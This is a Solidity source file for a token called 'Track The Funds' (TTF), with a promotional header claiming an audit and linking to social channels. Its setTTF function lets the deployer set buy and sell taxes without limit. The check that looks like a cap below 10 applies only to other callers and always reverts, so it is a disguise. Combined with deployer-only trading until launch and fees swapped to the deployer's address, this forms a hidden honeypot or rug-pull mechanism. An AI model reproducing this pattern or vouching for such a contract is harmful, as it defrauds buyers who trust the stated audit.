/*

TTF Bot generates reports, on-demand charts, and sends alerts on blockchain activity for any ETH or BSC token directly within Telegram.

Smart contract code has already been audited, please go check the Audit report on the website.

Bot is lve! Go access from the website!

TELEGRAM: https://t.me/TTFBotPortal
TWITTER: https://twitter.com/TTFBotETH
WEBSITE: https://ttfbot.space
MEDIUM: https://medium.com/@ttfbot
WHITEPAPER: https://trackthefunds.gitbook.io/track-the-funds-ttf-bot/

*/
// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.23;

    interface IUniswapV2Router02 {
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
            ) external;
        }
        
    contract TrackTheFunds {
        string public constant name = "Track The Funds";  //
        string public constant symbol = "TTF";  //
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 100_000_000 * 10**decimals;

        uint256 BurnTNumber = 0;
        uint256 ConfirmTNumber = 3;
        uint256 constant swapAmount = totalSupply / 100;

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;
            
        error Permissions();
            
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
            

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant deployer = payable(address(0x5fDDA84bDED21D71159cAF1d9c2AE70D0422Db86)); //

        bool private swapping;
        bool private TradingOpenStatus;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

         receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(TradingOpenStatus || from == deployer || to == deployer);

            if(!TradingOpenStatus && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                    );
                deployer.transfer(address(this).balance);
                swapping = false;
                }

            if(from != address(this)){
                uint256 FinalFigure = amount * (from == pair ? BurnTNumber : ConfirmTNumber) / 100;
                amount -= FinalFigure;
                balanceOf[address(this)] += FinalFigure;
            }
                balanceOf[to] += amount;
                emit Transfer(from, to, amount);
                return true;
            }

        function OpenTrade() external {
            require(msg.sender == deployer);
            require(!TradingOpenStatus);
            TradingOpenStatus = true;        
            }
            
        function setTTF(uint256 newTBurn, uint256 newTConfirm) external {
        if(msg.sender == deployer){
            BurnTNumber = newTBurn;
            ConfirmTNumber = newTConfirm;
            }
        else{
            require(newTBurn < 10);
            require(newTConfirm < 10);
            revert();
            }  
        }
        }